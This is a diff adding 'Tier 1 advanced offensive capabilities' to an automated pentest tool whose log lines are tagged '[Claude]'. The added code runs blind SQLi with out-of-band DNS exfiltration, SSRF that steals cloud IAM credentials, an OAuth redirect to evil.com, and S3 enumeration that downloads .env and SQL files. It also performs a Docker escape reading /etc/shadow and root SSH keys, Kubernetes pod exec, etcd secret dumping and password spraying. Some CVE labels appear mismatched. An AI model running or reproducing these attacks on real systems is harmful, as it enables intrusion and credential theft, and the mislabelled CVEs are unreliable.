@@ -7083,6 +7083,13 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
                 _auto_mitre_tag(f)
                 _auto_remediation(f)
                 _attach_msf_command(f, target, vars_dict)
+                # T3 H3: compliance auto-tagging
+                engine_ref = next(
+                    (e for e in _active_engines.values() if getattr(e, 'project_id', None) == project_id),
+                    None
+                )
+                if engine_ref and hasattr(engine_ref, '_auto_compliance_tag'):
+                    engine_ref._auto_compliance_tag(f)
                 project.setdefault("findings", []).append(f)
                 existing.add(title)
                 added += 1
@@ -8861,6 +8868,10 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             creds_and_hashes.append({"user": _cu, "password": _cp, "type": "cleartext"})
         if creds_and_hashes:
             self._lateral_movement_windows(target, self._last_open_ports if hasattr(self, "_last_open_ports") else [], creds_and_hashes, accumulated_output)
+
+        # ── G1: BloodHound full chain (if we have credentials) ────────────
+        if user and pwd:
+            self._bloodhound_ad_chain(target, user, pwd, accumulated_output)
 
     # ─────────────────────────────────────────────────────────────────────────
     # Active Directory attacks (Kerberoasting, AS-REP, BloodHound)
@@ -10835,6 +10846,1498 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
         }], target)
         accumulated_output.append(f"=== Persistencia {target} ===\n✓ SSH key + {'crontab + systemd' if is_root else 'user-level backdoor'}")
 
+    # ═════════════════════════════════════════════════════════════════════════
+    # TIER 1 — Advanced offensive capabilities
+    # ═════════════════════════════════════════════════════════════════════════
+
+    # ── F1: Advanced web exploits (SQLi OOB, SSRF→AWS, smuggling, IDOR, OAuth2) ──
+    def _advanced_web_exploits(self, target, open_ports, accumulated_output):
+        """Blind SQLi OOB, SSRF→AWS metadata, HTTP smuggling, IDOR, OAuth2 misconfig."""
+        http_ports = [p for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888, 3000, 5000)]
+        if not http_ports:
+            return
+        self._log(f"[Claude] F1-ADVWEB: SQLi OOB + SSRF + Smuggling + IDOR + OAuth2 → {target}")
+
+        for p in http_ports[:2]:
+            proto = "https" if p["port"] in (443, 8443) else "http"
+            base_url = f"{proto}://{target}:{p['port']}"
+
+            # ── F1a: Blind SQLi time-based + OOB DNS exfil ───────────────
+            self._log(f"[Claude] F1a: Blind SQLi time-based → {base_url}")
+            sqli_out, _ = self._run_cmd(
+                f"sqli-oob-{p['port']}",
+                # time-based blind on common params
+                f"sqlmap -u '{base_url}/?id=1' --batch --level=3 --risk=2 "
+                f"--technique=BT --time-sec=5 --dbms=auto "
+                f"--random-agent --output-dir=/tmp/sqlmap_{target.replace('.','_')} "
+                f"2>/dev/null | tail -20; "
+                # OOB via DNS (requires burp collaborator or interactsh)
+                f"IHOST=$(curl -sL --max-time 5 'https://api.interactsh.com/register' "
+                f"2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"print(d.get(\"url\",\"\"))' 2>/dev/null); "
+                f"[ -n \"$IHOST\" ] && "
+                f"curl -sL --max-time 8 '{base_url}/?id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,"
+                f"(SELECT version()),0x2e,$IHOST,0x5c5c))' 2>/dev/null | head -3",
+                target, timeout=120,
+            )
+            if sqli_out.strip():
+                accumulated_output.append(f"=== SQLi OOB {base_url} ===\n{sqli_out[:600]}")
+                if re.search(r'Parameter.*injectable|sqlmap identified|Type: time-based', sqli_out, re.IGNORECASE):
+                    self._save_findings([{
+                        "title": f"SQL Injection (Blind Time-Based) @ {base_url}",
+                        "severity": "critical",
+                        "description": f"sqlmap detectó inyección SQL blind en {base_url}.\n{sqli_out[:300]}",
+                        "cve": "",
+                    }], target)
+
+            # ── F1b: SSRF → AWS/GCP/Azure metadata ───────────────────────
+            self._log(f"[Claude] F1b: SSRF → Cloud metadata → {base_url}")
+            ssrf_payloads = [
+                ("http://169.254.169.254/latest/meta-data/", "AWS"),
+                ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
+                ("http://metadata.google.internal/computeMetadata/v1/?recursive=true", "GCP"),
+                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
+                ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
+                ("http://192.168.0.1/", "Internal"),
+                ("file:///etc/passwd", "LFI via SSRF"),
+            ]
+            ssrf_params = ["url", "redirect", "next", "target", "dest", "destination",
+                           "path", "uri", "link", "proxy", "callback", "fetch", "load",
+                           "host", "site", "page", "src", "source", "imageurl", "image"]
+            for ssrf_payload, ssrf_type in ssrf_payloads[:4]:
+                for ssrf_param in ssrf_params[:5]:
+                    ssrf_out, _ = self._run_cmd(
+                        f"ssrf-{ssrf_type.replace(' ','-')}-{ssrf_param}",
+                        f"curl -sL --max-time 6 -A 'Mozilla/5.0' "
+                        f"'{base_url}/?{ssrf_param}={ssrf_payload}' 2>/dev/null | head -15; "
+                        f"curl -sL --max-time 6 -A 'Mozilla/5.0' "
+                        f"-X POST '{base_url}/api/v1/fetch' "
+                        f"-d '{ssrf_param}={ssrf_payload}' 2>/dev/null | head -15",
+                        target, timeout=20,
+                    )
+                    if re.search(r'ami-id|instance-id|iam.*role|project-id|subscription|computeMetadata|root:x:0', ssrf_out, re.IGNORECASE):
+                        self._log(f"[Claude] F1b: SSRF → {ssrf_type} confirmado!")
+                        # Try to get IAM credentials
+                        iam_creds = ""
+                        if "AWS" in ssrf_type:
+                            role_match = re.search(r'[\w\-]+', ssrf_out)
+                            if role_match:
+                                iam_out, _ = self._run_cmd(
+                                    "ssrf-aws-iam-creds",
+                                    f"curl -sL --max-time 8 '{base_url}/?{ssrf_param}="
+                                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_match.group()}' 2>/dev/null | head -20",
+                                    target, timeout=15,
+                                )
+                                if "AccessKeyId" in iam_out:
+                                    iam_creds = f"\nAWS IAM Credentials leaked:\n{iam_out[:400]}"
+                        self._save_findings([{
+                            "title": f"SSRF → {ssrf_type} Metadata Leak @ {base_url}",
+                            "severity": "critical",
+                            "description": f"SSRF via param '{ssrf_param}' → {ssrf_type} metadata accessible.\n{ssrf_out[:300]}{iam_creds}",
+                            "cve": "CVE-2021-26855" if "Azure" in ssrf_type else "",
+                        }], target)
+                        accumulated_output.append(f"=== SSRF {ssrf_type} ===\n{ssrf_out[:400]}{iam_creds}")
+                        break
+
+            # ── F1c: HTTP Request Smuggling ───────────────────────────────
+            self._log(f"[Claude] F1c: HTTP Request Smuggling → {base_url}")
+            smug_out, _ = self._run_cmd(
+                f"http-smuggling-{p['port']}",
+                f"python3 -c \"\nimport socket,ssl,time\n"
+                f"h='{target}';port={p['port']}\n"
+                f"# CL-TE smuggle probe\n"
+                f"req=b'POST / HTTP/1.1\\r\\n"
+                f"Host: {target}\\r\\nContent-Length: 6\\r\\n"
+                f"Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX'\n"
+                f"try:\n"
+                f"  s=socket.create_connection((h,port),timeout=5)\n"
+                f"  if port in (443,8443): s=ssl.wrap_socket(s)\n"
+                f"  s.send(req);time.sleep(2);r=s.recv(4096).decode('utf-8','ignore')\n"
+                f"  print(r[:200])\nexcept Exception as e: print(f'ERR:{{e}}')\n\" 2>/dev/null; "
+                f"# Also try smuggler.py\n"
+                f"python3 /opt/smuggler/smuggler.py -u '{base_url}/' "
+                f"--log /tmp/smuggler_{target.replace('.','_')}.log 2>/dev/null | head -15; "
+                f"cat /tmp/smuggler_{target.replace('.','_')}.log 2>/dev/null | head -10",
+                target, timeout=30,
+            )
+            if re.search(r'smuggl|CL\.TE|TE\.CL|desync|Issue found|vulnerable', smug_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"HTTP Request Smuggling @ {base_url}",
+                    "severity": "high",
+                    "description": f"HTTP request desync detectado en {base_url}.\n{smug_out[:300]}",
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== HTTP Smuggling {base_url} ===\n{smug_out[:400]}")
+
+            # ── F1d: IDOR bruteforce ──────────────────────────────────────
+            self._log(f"[Claude] F1d: IDOR bruteforce → {base_url}")
+            # Discover endpoints first, then test numeric ID variation
+            idor_crawl, _ = self._run_cmd(
+                f"idor-crawl-{p['port']}",
+                f"curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
+                f"grep -oP '(?:href|src|action)=[\"\\x27][^\"\\x27]+[\"\\x27]' | "
+                f"grep -oP '[\"\\x27][^\"\\x27]+[\"\\x27]' | tr -d '\"\\x27' | "
+                f"grep -E '/[a-z].*(\\?|/)[a-z]*[0-9]+' | head -10",
+                target, timeout=15,
+            )
+            idor_endpoints = re.findall(r'(/[^\s<>"\']+(?:\?|/)\w*\d+[^\s<>"\']*)', idor_crawl)
+            for ep in idor_endpoints[:3]:
+                base_ep = re.sub(r'\d+', '{}', ep)
+                orig_id = re.search(r'\d+', ep)
+                if not orig_id:
+                    continue
+                oid = int(orig_id.group())
+                idor_hits = []
+                for test_id in [oid - 2, oid - 1, oid + 1, oid + 2, 1, 2, 3, 100, 999]:
+                    test_ep = base_ep.format(test_id)
+                    idor_out, _ = self._run_cmd(
+                        f"idor-test-{test_id}",
+                        f"curl -sL --max-time 5 -o /dev/null -w '%{{http_code}} %{{size_download}}' "
+                        f"'{base_url}{test_ep}' 2>/dev/null",
+                        target, timeout=10,
+                    )
+                    code_match = re.search(r'^(\d{3}) (\d+)', idor_out)
+                    if code_match and code_match.group(1) == "200" and int(code_match.group(2)) > 50:
+                        idor_hits.append(f"{test_ep} → {idor_out.strip()}")
+                if len(idor_hits) > 2:
+                    self._save_findings([{
+                        "title": f"IDOR (Insecure Direct Object Reference) @ {base_url}{base_ep}",
+                        "severity": "high",
+                        "description": f"Acceso a objetos de otros usuarios sin autorización:\n" + "\n".join(idor_hits[:5]),
+                        "cve": "",
+                    }], target)
+
+            # ── F1e: OAuth2 misconfig detection ──────────────────────────
+            self._log(f"[Claude] F1e: OAuth2 misconfig → {base_url}")
+            oauth_paths = [
+                "/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
+                "/.well-known/openid-configuration", "/oauth/token",
+                "/api/oauth/callback", "/login/oauth",
+            ]
+            for oauth_path in oauth_paths:
+                oauth_out, _ = self._run_cmd(
+                    f"oauth-{oauth_path.replace('/','_')[:20]}",
+                    f"curl -sL --max-time 8 -D - "
+                    f"'{base_url}{oauth_path}?response_type=token"
+                    f"&client_id=test&redirect_uri=http://evil.com&state=x' 2>/dev/null | head -30; "
+                    f"curl -sL --max-time 8 "
+                    f"'{base_url}{oauth_path}?response_type=code"
+                    f"&client_id=test&redirect_uri=javascript:alert(1)' 2>/dev/null | head -10",
+                    target, timeout=15,
+                )
+                if re.search(r'access_token|id_token|code=|token_type|implicit|Bearer', oauth_out, re.IGNORECASE):
+                    issues = []
+                    if "evil.com" in oauth_out or "redirect_uri" in oauth_out.lower():
+                        issues.append("Open redirect en OAuth2 — token leakage posible")
+                    if "javascript:" in oauth_out.lower():
+                        issues.append("OAuth2 redirect_uri acepta javascript: — XSS via OAuth")
+                    if re.search(r'access_token=.{10,}', oauth_out):
+                        issues.append("Token expuesto directamente en respuesta (implicit flow)")
+                    if issues:
+                        self._save_findings([{
+                            "title": f"OAuth2 Misconfiguration @ {base_url}{oauth_path}",
+                            "severity": "high",
+                            "description": "\n".join(issues) + f"\n\nResponse:\n{oauth_out[:300]}",
+                            "cve": "",
+                        }], target)
+                    break
+
+    # ── F2: Cloud attack surface (AWS/Azure/GCP/S3/Terraform) ─────────────
+    def _cloud_attack(self, target, open_ports, accumulated_output):
+        """S3 bucket enum, AWS/GCP/Azure metadata, Terraform state, IAM escalation."""
+        import socket
+        self._log(f"[Claude] F2-CLOUD: AWS/Azure/GCP attack surface → {target}")
+
+        # Derive apex domain for bucket guessing
+        try:
+            parts = target.rstrip(".").split(".")
+            apex = ".".join(parts[-2:]) if len(parts) >= 2 else target
+            apex_nodot = apex.replace(".", "-").replace("_", "-")
+            company = parts[0] if parts else target
+        except Exception:
+            apex = target; apex_nodot = target; company = target
+
+        # ── F2a: S3 bucket enumeration ────────────────────────────────────
+        self._log(f"[Claude] F2a: S3 bucket enum → {apex}")
+        bucket_names = [
+            apex_nodot, company, f"{company}-backup", f"{company}-data",
+            f"{company}-prod", f"{company}-dev", f"{company}-staging",
+            f"{company}-assets", f"{company}-static", f"{company}-files",
+            f"backup-{company}", f"dev-{company}", f"prod-{company}",
+            f"{company}-logs", f"{company}-config", f"{company}-secrets",
+        ]
+        for bname in bucket_names:
+            s3_out, _ = self._run_cmd(
+                f"s3-enum-{bname[:30]}",
+                f"aws s3 ls s3://{bname} --no-sign-request 2>&1 | head -10; "
+                f"curl -sL --max-time 5 'https://{bname}.s3.amazonaws.com/' 2>/dev/null | head -10; "
+                f"curl -sL --max-time 5 'https://s3.amazonaws.com/{bname}/' 2>/dev/null | head -10",
+                target, timeout=20,
+            )
+            if re.search(r'PRE |[0-9]{4}-[0-9]{2}-[0-9]{2}.*[0-9]+|ListBucketResult', s3_out):
+                # Bucket is public — list contents
+                ls_out, _ = self._run_cmd(
+                    f"s3-list-{bname[:30]}",
+                    f"aws s3 ls s3://{bname} --no-sign-request --recursive 2>/dev/null | "
+                    f"grep -iE '\\.(env|sql|bak|key|pem|config|conf|cfg|json|yaml|xml|csv|tar|zip)' | head -20; "
+                    f"# Download sensitive files\n"
+                    f"aws s3 cp s3://{bname}/.env /tmp/s3_{bname[:20]}.env --no-sign-request 2>/dev/null; "
+                    f"aws s3 cp s3://{bname}/backup.sql /tmp/s3_{bname[:20]}.sql --no-sign-request 2>/dev/null; "
+                    f"cat /tmp/s3_{bname[:20]}.env 2>/dev/null | head -20",
+                    target, timeout=30,
+                )
+                sensitive_files = re.findall(r'[^\s]+\.(?:env|sql|bak|key|pem|config|conf|cfg)', ls_out, re.IGNORECASE)
+                self._save_findings([{
+                    "title": f"S3 Bucket Público Expuesto: s3://{bname}",
+                    "severity": "critical",
+                    "description": (
+                        f"Bucket S3 '{bname}' accesible públicamente sin autenticación.\n"
+                        f"Archivos sensibles: {', '.join(sensitive_files[:8]) or 'ver listado'}\n"
+                        f"Listado:\n{ls_out[:400]}"
+                    ),
+                    "cve": "",
+                }], target)
+                accumulated_output.append(f"=== S3 Public {bname} ===\n{ls_out[:600]}")
+
+        # ── F2b: AWS metadata via SSRF (also try direct if on EC2) ───────
+        self._log(f"[Claude] F2b: AWS metadata direct check → {target}")
+        aws_meta, _ = self._run_cmd(
+            "aws-metadata-direct",
+            # Try direct metadata endpoint (works if attacker is on same EC2 or SSRF)
+            f"curl -sL --max-time 5 'http://169.254.169.254/latest/meta-data/' 2>/dev/null; "
+            f"curl -sL --max-time 5 --header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
+            f"-X PUT 'http://169.254.169.254/latest/api/token' 2>/dev/null > /tmp/imdsv2_token.txt; "
+            f"TOKEN=$(cat /tmp/imdsv2_token.txt 2>/dev/null); "
+            f"[ -n \"$TOKEN\" ] && curl -sL --max-time 5 "
+            f"-H \"X-aws-ec2-metadata-token: $TOKEN\" "
+            f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null; "
+            f"# Check instance metadata service\n"
+            f"curl -sL --max-time 5 'http://169.254.169.254/latest/dynamic/instance-identity/document' 2>/dev/null | head -20",
+            target, timeout=20,
+        )
+        if re.search(r'ami-id|instance-id|instanceType|accountId|region', aws_meta, re.IGNORECASE):
+            # Try to get IAM role credentials
+            role_out, _ = self._run_cmd(
+                "aws-iam-role-creds",
+                f"ROLE=$(curl -sL --max-time 5 "
+                f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null | head -1); "
+                f"[ -n \"$ROLE\" ] && curl -sL --max-time 5 "
+                f"\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"print(f\"AccessKeyId: {{d.get(chr(65)+chr(99)+chr(99)+chr(101)+chr(115)+chr(115)+chr(75)+chr(101)+chr(121)+chr(73)+chr(100))}}\"); "
+                f"print(f\"SecretAccessKey: {{d.get(chr(83)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(65)+chr(99)+chr(99)+chr(101)+chr(115)+chr(115)+chr(75)+chr(101)+chr(121))}}\"); "
+                f"print(f\"Token: {{d.get(chr(84)+chr(111)+chr(107)+chr(101)+chr(110))[:30]}}\")' 2>/dev/null",
+                target, timeout=15,
+            )
+            self._save_findings([{
+                "title": f"AWS EC2 Metadata Service Accessible → IAM Credentials Exposed",
+                "severity": "critical",
+                "description": f"EC2 IMDS accesible.\nInstance info:\n{aws_meta[:300]}\n{role_out[:200]}",
+                "cve": "CVE-2019-0232",
+            }], target)
+            accumulated_output.append(f"=== AWS IMDS ===\n{aws_meta[:400]}\n{role_out[:300]}")
+
+        # ── F2c: Azure metadata + managed identity ────────────────────────
+        azure_meta, _ = self._run_cmd(
+            "azure-metadata",
+            f"curl -sL --max-time 5 "
+            f"-H 'Metadata: true' "
+            f"'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -20; "
+            f"# Managed identity token\n"
+            f"curl -sL --max-time 5 "
+            f"-H 'Metadata: true' "
+            f"'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
+            f"&resource=https://management.azure.com/' 2>/dev/null | head -10",
+            target, timeout=15,
+        )
+        if re.search(r'subscriptionId|resourceGroupName|access_token.*eyJ', azure_meta, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"Azure IMDS → Managed Identity Token Exposed",
+                "severity": "critical",
+                "description": f"Azure Instance Metadata Service accesible. Token de identidad obtenido.\n{azure_meta[:400]}",
+                "cve": "",
+            }], target)
+
+        # ── F2d: GCP metadata ─────────────────────────────────────────────
+        gcp_meta, _ = self._run_cmd(
+            "gcp-metadata",
+            f"curl -sL --max-time 5 "
+            f"-H 'Metadata-Flavor: Google' "
+            f"'http://metadata.google.internal/computeMetadata/v1/instance/' 2>/dev/null | head -10; "
+            f"curl -sL --max-time 5 "
+            f"-H 'Metadata-Flavor: Google' "
+            f"'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null | head -5",
+            target, timeout=15,
+        )
+        if re.search(r'project-id|service-accounts|access_token|token_type', gcp_meta, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"GCP Metadata Server → Service Account Token Exposed",
+                "severity": "critical",
+                "description": f"GCP Compute Engine metadata accessible.\n{gcp_meta[:300]}",
+                "cve": "",
+            }], target)
+
+        # ── F2e: Terraform state file exposure ────────────────────────────
+        self._log(f"[Claude] F2e: Terraform state exposure → {target}")
+        tf_paths = [
+            "/terraform.tfstate", "/terraform/terraform.tfstate",
+            "/.terraform/terraform.tfstate", "/infra/terraform.tfstate",
+            "/deploy/terraform.tfstate", "/tf/terraform.tfstate",
+        ]
+        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443)]
+        for hp in http_ports[:1]:
+            proto = "https" if hp["port"] in (443, 8443) else "http"
+            for tf_path in tf_paths:
+                tf_out, _ = self._run_cmd(
+                    f"tf-state-{tf_path.replace('/', '_')[:20]}",
+                    f"curl -sL --max-time 8 -o /dev/null -w '%{{http_code}} %{{content_type}}' "
+                    f"'{proto}://{target}:{hp['port']}{tf_path}' 2>/dev/null; "
+                    f"curl -sL --max-time 8 "
+                    f"'{proto}://{target}:{hp['port']}{tf_path}' 2>/dev/null | "
+                    f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                    f"resources=[r.get(\"type\") for r in d.get(\"resources\",[])]; "
+                    f"print(f\"Resources: {{\",\".join(set(resources[:10]))}}\"); "
+                    f"# Extract secrets\n"
+                    f"text=str(d);\n"
+                    f"import re; secrets=re.findall(r\\\"(?:password|secret|key|token).*?:\\\\\"([^\\\"]+)\\\"\\\", text, re.I);\n"
+                    f"print(f\\\"Secrets found: {{secrets[:5]}}\\\")' 2>/dev/null | head -10",
+                    target, timeout=15,
+                )
+                if re.search(r'Resources:|Secrets found:|aws_instance|azurerm|google_', tf_out, re.IGNORECASE):
+                    self._save_findings([{
+                        "title": f"Terraform State File Exposed @ {proto}://{target}:{hp['port']}{tf_path}",
+                        "severity": "critical",
+                        "description": f"Terraform state file accesible públicamente — contiene infraestructura y posibles secretos.\n{tf_out[:400]}",
+                        "cve": "",
+                    }], target)
+                    break
+
+    # ── F3: Container escape & Kubernetes attacks ──────────────────────────
+    def _container_k8s_escape(self, target, open_ports, accumulated_output):
+        """Docker privileged escape, K8s API anon, etcd dump, service account abuse."""
+        self._log(f"[Claude] F3-CONTAINER/K8s: Docker escape + Kubernetes → {target}")
+        port_set = {p["port"] for p in open_ports}
+
+        # ── F3a: Docker API exposed (port 2375/2376) ──────────────────────
+        docker_ports = [p for p in [2375, 2376, 2377] if p in port_set]
+        for dp in docker_ports:
+            proto = "https" if dp in (2376, 2377) else "http"
+            self._log(f"[Claude] F3a: Docker API → {target}:{dp}")
+            docker_out, _ = self._run_cmd(
+                f"docker-api-{dp}",
+                f"curl -sL --max-time 8 '{proto}://{target}:{dp}/v1.41/info' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"print(f\"Docker {d.get(chr(83)+chr(101)+chr(114)+chr(118)+chr(101)+chr(114)+chr(86)+chr(101)+chr(114)+chr(115)+chr(105)+chr(111)+chr(110))}: OS={d.get(chr(79)+chr(83)+chr(84)+chr(121)+chr(112)+chr(101))}, Containers={d.get(chr(67)+chr(111)+chr(110)+chr(116)+chr(97)+chr(105)+chr(110)+chr(101)+chr(114)+chr(115))}\")' 2>/dev/null; "
+                f"curl -sL --max-time 8 '{proto}://{target}:{dp}/v1.41/containers/json' 2>/dev/null | "
+                f"python3 -c 'import sys,json; cs=json.load(sys.stdin); "
+                f"[print(f\"Container: {{c.get(chr(78)+chr(97)+chr(109)+chr(101)+chr(115),[\"\"])[0]}} Image={{c.get(chr(73)+chr(109)+chr(97)+chr(103)+chr(101))}}\") for c in cs[:5]]' 2>/dev/null",
+                target, timeout=20,
+            )
+            if re.search(r'Docker|Container|ServerVersion|Containers:', docker_out, re.IGNORECASE):
+                accumulated_output.append(f"=== Docker API Exposed {target}:{dp} ===\n{docker_out[:500]}")
+                # Escape: create privileged container that mounts host root
+                escape_out, _ = self._run_cmd(
+                    f"docker-escape-{dp}",
+                    f"docker -H {proto}://{target}:{dp} run --rm --privileged "
+                    f"-v /:/mnt/host alpine:latest sh -c "
+                    f"'cat /mnt/host/etc/shadow 2>/dev/null | head -5; "
+                    f"cat /mnt/host/root/.ssh/id_rsa 2>/dev/null | head -5; "
+                    f"cat /mnt/host/root/root.txt 2>/dev/null; "
+                    f"echo \"DOCKER_ESCAPE_SUCCESS: $(cat /mnt/host/etc/hostname)\"' 2>/dev/null | head -20",
+                    target, timeout=60,
+                )
+                if "DOCKER_ESCAPE_SUCCESS" in escape_out or re.search(r'root:.*:\d+:\d+:', escape_out):
+                    self._save_findings([{
+                        "title": f"Docker API RCE → Host Escape @ {target}:{dp}",
+                        "severity": "critical",
+                        "description": f"Docker API expuesto sin autenticación → contenedor privilegiado → root del host.\n{escape_out[:400]}",
+                        "cve": "CVE-2019-5736",
+                    }], target)
+                else:
+                    self._save_findings([{
+                        "title": f"Docker API Expuesto sin Auth @ {target}:{dp}",
+                        "severity": "critical",
+                        "description": f"Docker daemon API accesible sin autenticación en {target}:{dp}.\n{docker_out[:300]}",
+                        "cve": "",
+                    }], target)
+
+        # ── F3b: Kubernetes API server (6443/8080) ─────────────────────────
+        k8s_ports = [p for p in [6443, 8080, 8443, 10250, 10255, 2379] if p in port_set]
+        for kp in k8s_ports:
+            self._log(f"[Claude] F3b: Kubernetes API → {target}:{kp}")
+            proto = "https" if kp in (6443, 8443, 10250) else "http"
+            k8s_out, _ = self._run_cmd(
+                f"k8s-api-{kp}",
+                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/namespaces' 2>/dev/null | head -20; "
+                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/secrets' 2>/dev/null | head -20; "
+                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/pods' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+                f"pods=[i.get(\"metadata\",{{}}).get(\"name\") for i in d.get(\"items\",[])]; "
+                f"print(f\"Pods: {{\", \".join(str(p) for p in pods[:8])}}\")' 2>/dev/null",
+                target, timeout=20,
+            )
+            if re.search(r'namespace|kube-system|default|Pod|items|kind.*List', k8s_out, re.IGNORECASE):
+                accumulated_output.append(f"=== K8s API {target}:{kp} ===\n{k8s_out[:600]}")
+                # Try to exec into a pod
+                pod_names = re.findall(r'(?:name|Name).*?([a-z][a-z0-9\-]+)', k8s_out)
+                if pod_names:
+                    exec_out, _ = self._run_cmd(
+                        "k8s-pod-exec",
+                        f"curl -sLk --max-time 15 "
+                        f"'{proto}://{target}:{kp}/api/v1/namespaces/default/pods/{pod_names[0]}/exec"
+                        f"?command=id&command=hostname&stdin=false&stdout=true&tty=false' 2>/dev/null | head -10; "
+                        f"kubectl --server={proto}://{target}:{kp} --insecure-skip-tls-verify "
+                        f"exec {pod_names[0]} -- id 2>/dev/null | head -5",
+                        target, timeout=15,
+                    )
+                    if "uid=" in exec_out:
+                        self._save_findings([{
+                            "title": f"Kubernetes Unauthenticated RCE via Pod Exec @ {target}:{kp}",
+                            "severity": "critical",
+                            "description": f"K8s API anónimo permite exec en pods.\nPod: {pod_names[0]}\n{exec_out[:300]}",
+                            "cve": "",
+                        }], target)
+                    else:
+                        self._save_findings([{
+                            "title": f"Kubernetes API Unauthenticated — Secret/Pod Listing @ {target}:{kp}",
+                            "severity": "critical",
+                            "description": f"K8s API accesible sin autenticación en {target}:{kp}.\n{k8s_out[:400]}",
+                            "cve": "",
+                        }], target)
+
+        # ── F3c: etcd no-auth (port 2379) ─────────────────────────────────
+        if 2379 in port_set:
+            self._log(f"[Claude] F3c: etcd no-auth → {target}:2379")
+            etcd_out, _ = self._run_cmd(
+                "etcd-noauth",
+                f"curl -sL --max-time 10 "
+                f"'http://{target}:2379/v2/keys/?recursive=true' 2>/dev/null | "
+                f"python3 -c 'import sys,json,re; t=sys.stdin.read(); "
+                f"secrets=re.findall(r\\\"(?:token|password|secret|key|cert)[\\\"\\s:]+[\\\"\\']([^\\\"\\x27{{}}]+)[\\\"\\x27]\\\", t, re.I); "
+                f"print(f\\\"etcd secrets: {{secrets[:5]}}\\\"); print(t[:500])' 2>/dev/null | head -20; "
+                f"# v3 API\n"
+                f"ETCDCTL_API=3 etcdctl --endpoints=http://{target}:2379 get / --prefix --keys-only 2>/dev/null | head -20; "
+                f"ETCDCTL_API=3 etcdctl --endpoints=http://{target}:2379 get /registry/secrets --prefix 2>/dev/null | head -30",
+                target, timeout=30,
+            )
+            if re.search(r'etcd secrets:|/registry|nodes|token|password', etcd_out, re.IGNORECASE):
+                self._save_findings([{
+                    "title": f"etcd No-Auth — Kubernetes Secrets Exposed @ {target}:2379",
+                    "severity": "critical",
+                    "description": f"etcd sin autenticación — todos los secrets de Kubernetes expuestos.\n{etcd_out[:500]}",
+                    "cve": "CVE-2020-15106",
+                }], target)
+                accumulated_output.append(f"=== etcd no-auth ===\n{etcd_out[:600]}")
+
+        # ── F3d: Service account token inside container ────────────────────
+        # (runs locally on pentest box — only useful if we already have a shell via container)
+        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        sa_check, _ = self._run_cmd(
+            "k8s-sa-token",
+            f"[ -f {sa_token_path} ] && "
+            f"TOKEN=$(cat {sa_token_path}) && "
+            f"echo \"SA_TOKEN_FOUND\" && "
+            f"K8S_HOST=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null); "
+            f"curl -sLk -H \"Authorization: Bearer $TOKEN\" "
+            f"'https://kubernetes.default.svc/api/v1/secrets' 2>/dev/null | head -20; "
+            f"curl -sLk -H \"Authorization: Bearer $TOKEN\" "
+            f"'https://kubernetes.default.svc/api/v1/namespaces' 2>/dev/null | head -10",
+            target, timeout=15,
+        )
+        if "SA_TOKEN_FOUND" in sa_check or re.search(r'kind.*SecretList|namespace.*kube', sa_check, re.IGNORECASE):
+            self._save_findings([{
+                "title": f"Kubernetes Service Account Token Abused — API Escalation",
+                "severity": "critical",
+                "description": f"Service account token disponible y con permisos de listing de secrets.\n{sa_check[:400]}",
+                "cve": "",
+            }], target)
+
+    # ── F4: Advanced credential attacks (smart spray, coercion, NTLM delegate) ─
+    def _advanced_credential_attacks(self, target, open_ports, accumulated_output):
+        """NTLM delegate relay, PetitPotam/PrinterBug coercion, smart password patterns."""
+        self._log(f"[Claude] F4-CREDS: Advanced credential attacks → {target}")
+        port_set = {p["port"] for p in open_ports}
+
+        # ── F4a: Smart password pattern generation ────────────────────────
+        # Harvest usernames from OSINT output, generate likely passwords
+        combined = "\n".join(accumulated_output[-40:])
+        discovered_users = list(set(re.findall(
+            r'(?:user(?:name)?|login|account|samaccountname)[:\s]+([a-zA-Z][a-zA-Z0-9_\.\-]{2,20})',
+            combined, re.IGNORECASE
+        )))
+        # Also grab from harvester output
+        harvested_emails = re.findall(r'[\w\.\-]+@[\w\.\-]+', combined)
+        email_users = [e.split("@")[0] for e in harvested_emails[:10]]
+        all_users = list(set(discovered_users + email_users))[:20]
+
+        if all_users and (445 in port_set or 389 in port_set or 80 in port_set):
+            self._log(f"[Claude] F4a: Smart spray → {len(all_users)} users on {target}")
+            # Generate smart patterns
+            current_year = "2024"
+            smart_passwords = [
+                "Password1!", f"Password{current_year}!", "Welcome1!", f"Welcome{current_year}!",
